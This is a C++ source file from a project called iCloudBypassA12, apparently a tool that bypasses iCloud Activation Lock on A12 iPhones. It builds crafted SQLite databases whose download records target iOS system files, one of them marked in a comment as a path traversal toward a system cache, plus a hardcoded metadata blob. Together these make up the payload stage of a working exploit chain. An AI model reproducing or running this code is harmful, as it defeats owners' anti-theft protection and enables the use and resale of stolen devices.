/// @file sqlite_builder.cpp
/// @brief SQLite builder implementation.
/// @copyright MIT License

#include "iCloudBypassA12/payload/sqlite_builder.hpp"
#include "iCloudBypassA12/bypass/config.hpp"
#include "iCloudBypassA12/core/logger.hpp"
#include <fstream>
#include <sstream>

namespace a12bypass {

Result<ByteBuffer> SqliteBuilder::build_downloads_db(
    std::string_view guid,
    std::string_view bldb_url
) {
    LOG_DEBUG("Building downloads.28.sqlitedb with GUID: ", guid);
    
    std::ostringstream sql;
    sql << sql::downloads_schema;
    
    // Insert asset records
    // Asset 1: iTunesMetadata.plist trigger
    sql << "INSERT INTO asset VALUES(1,1,0,'media',0,'"
        << bldb_url << "',NULL,"
        << "'/private/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist',"
        << "'plist',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);\n";
    
    // Asset 2: BLDatabaseManager.sqlite-wal
    sql << "INSERT INTO asset VALUES(2,1,0,'media',0,'"
        << bldb_url << "',NULL,"
        << "'/private/var/containers/Shared/SystemGroup/" << guid 
        << "/Documents/BLDatabaseManager/BLDatabaseManager.sqlite-wal',"
        << "'epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);\n";
    
    // Asset 3: BLDatabaseManager.sqlite-shm
    sql << "INSERT INTO asset VALUES(3,1,0,'media',0,'"
        << bldb_url << "',NULL,"
        << "'/private/var/containers/Shared/SystemGroup/" << guid 
        << "/Documents/BLDatabaseManager/BLDatabaseManager.sqlite-shm',"
        << "'epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);\n";
    
    // Asset 4: BLDatabaseManager.sqlite
    sql << "INSERT INTO asset VALUES(4,1,0,'media',0,'"
        << bldb_url << "',NULL,"
        << "'/private/var/containers/Shared/SystemGroup/" << guid 
        << "/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',"
        << "'epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);\n";
    
    sql << "COMMIT;\n";
    
    return execute_sql(sql.str());
}

Result<ByteBuffer> SqliteBuilder::build_bldb(std::string_view asset_url) {
    LOG_DEBUG("Building BLDatabaseManager.sqlite");
    
    std::ostringstream sql;
    sql << sql::bldb_schema;
    
    // Insert download info record with path traversal
    sql << "INSERT INTO ZBLDOWNLOADINFO VALUES("
        << "1,"    // Z_PK
        << "1,"    // Z_ENT
        << "1,"    // Z_OPT
        << "1,"    // ZDOWNLOADID
        << "1,"    // ZPRIORITY
        << "0,"    // ZSTATE (pending)
        << "0.0,"  // ZDOWNLOADPERCENT
        << "0.0,"  // ZDOWNLOADPROGRESS
        << "'" << paths::gestalt_cache_traversal << "',"  // ZASSETPATH
        << "NULL," // ZDOWNLOADERROR
        << "'J19N_PUB_190099164604738',"  // ZDOWNLOADIDENTIFIER
        << "'" << asset_url << "',"  // ZDOWNLOADURL
        << "'" << asset_url << "'"   // ZURL
        << ");\n";
    
    // Insert metadata blob
    sql << "INSERT INTO Z_METADATA VALUES(1,'2D3944E4-521A-43A6-AFF5-55A3E2A63841',X'"
        << "62706c6973743030d80102030405060708090b0c0d0e0f14155f101e4e5353746f72654d6f64656c56657273696f6e4964656e746966696572735b4e5353746f7265547970655f10125f4e534175746f56616375756d4c6576656c5f101f4e5353746f72654d6f64656c56657273696f6e4861736865734469676573745f101e4e5353746f72654d6f64656c56657273696f6e436865636b73756d4b65795f10194e5353746f72654d6f64656c56657273696f6e4861736865735f101d4e5350657273697374656e63654672616d65776f726b56657273696f6e5f10204e5353746f72654d6f64656c56657273696f6e48617368657356657273696f6ea10a505653514c69746551325f10586d4a52623772585a664f6e6a7541714d504739695537424d4164766672543033797a7678344878636273307a34636e4b6f357a677262715149635542764c65527a524f506c79744249307a4a5772546b4e4639314f773d3d5f102c7671527a56456f3535615a6d6d433733355a63682b734c42336a4a6c6366314b4a4c476b456c79527a79513dd2101112135f1014424c446f776e6c6f6164506f6c696379496e666f5e424c446f776e6c6f6164496e666f4f102045bb929b5dd5da6fbca53674a37213713b95aef9df0c51c7085cc1e283f02f714f1020b42f3d26a27e7248429c9d5466fc52910c9b42055169caafcc2ec5e396c86f631105a7100300080019003a0046005b007d009e00ba00da00fd00ff01000107010901640193019801af01be01e1020402070000000000000201000000000000001600000000000000000000000000000209"
        << "');\n";
    
    sql << "COMMIT;\n";
    
    return execute_sql(sql.str());
}

Result<void> SqliteBuilder::write_to_file(ByteSpan data, const fs::path& path) {
    std::ofstream file(path, std::ios::binary);
    if (!file) {
        return Result<void>::failure(
            ErrorCode::FileWriteFailed,
            "Failed to create file: " + path.string()
        );
    }
    
    file.write(reinterpret_cast<const char*>(data.data()), 
               static_cast<std::streamsize>(data.size()));
    
    if (!file.good()) {
        return Result<void>::failure(
            ErrorCode::FileWriteFailed,
            "Failed to write file: " + path.string()
        );
    }
    
    LOG_DEBUG("Wrote ", data.size(), " bytes to ", path.filename().string());
    return Result<void>::success();
}

Result<ByteBuffer> SqliteBuilder::load_from_file(const fs::path& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) {
        return Result<ByteBuffer>::failure(
            ErrorCode::FileReadFailed,
            "Failed to open file: " + path.string()
        );
    }
    
    const auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    ByteBuffer data(static_cast<std::size_t>(size));
    if (!file.read(reinterpret_cast<char*>(data.data()), size)) {
        return Result<ByteBuffer>::failure(
            ErrorCode::FileReadFailed,
            "Failed to read file: " + path.string()
        );
    }
    
    return Result<ByteBuffer>::success(std::move(data));
}

Result<ByteBuffer> SqliteBuilder::execute_sql(std::string_view sql) {
    sqlite3* db = nullptr;
    
    int rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        return Result<ByteBuffer>::failure(
            ErrorCode::SqliteCreationFailed,
            "Failed to create in-memory database"
        );
    }
    
    SqliteHandle db_guard{db};
    
    char* errmsg = nullptr;
    rc = sqlite3_exec(db, std::string(sql).c_str(), nullptr, nullptr, &errmsg);
    
    if (rc != SQLITE_OK) {
        std::string error = errmsg ? errmsg : "Unknown SQL error";
        sqlite3_free(errmsg);
        return Result<ByteBuffer>::failure(
            ErrorCode::SqliteCreationFailed,
            "SQL execution failed: " + error
        );
    }
    
    auto result = serialize_database(db);
    
    if (result.empty()) {
        return Result<ByteBuffer>::failure(
            ErrorCode::SqliteCreationFailed,
            "Failed to serialize database"
        );
    }
    
    LOG_DEBUG("Generated SQLite database: ", result.size(), " bytes");
    return Result<ByteBuffer>::success(std::move(result));
}

ByteBuffer SqliteBuilder::serialize_database(sqlite3* db) {
#if SQLITE_VERSION_NUMBER >= 3023000
    sqlite3_int64 size = 0;
    unsigned char* data = sqlite3_serialize(db, "main", &size, 0);
    
    if (!data || size == 0) {
        return {};
    }
    
    ByteBuffer result(data, data + size);
    sqlite3_free(data);
    return result;
#else
    // Fallback: backup to temp file
    auto temp_path = fs::temp_directory_path() / "a12bypass_temp.db";
    
    sqlite3* file_db = nullptr;
    int rc = sqlite3_open(temp_path.c_str(), &file_db);
    if (rc != SQLITE_OK) {
        return {};
    }
    
    SqliteHandle file_guard{file_db};
    
    sqlite3_backup* backup = sqlite3_backup_init(file_db, "main", db, "main");
    if (!backup) {
        return {};
    }
    
    sqlite3_backup_step(backup, -1);
    sqlite3_backup_finish(backup);
    file_guard.reset();
    
    // Read the file
    std::ifstream file(temp_path, std::ios::binary | std::ios::ate);
    if (!file) {
        fs::remove(temp_path);
        return {};
    }
    
    auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    ByteBuffer result(static_cast<std::size_t>(size));
    file.read(reinterpret_cast<char*>(result.data()), size);
    file.close();
    
    fs::remove(temp_path);
    return result;
#endif
}

} // namespace a12bypass
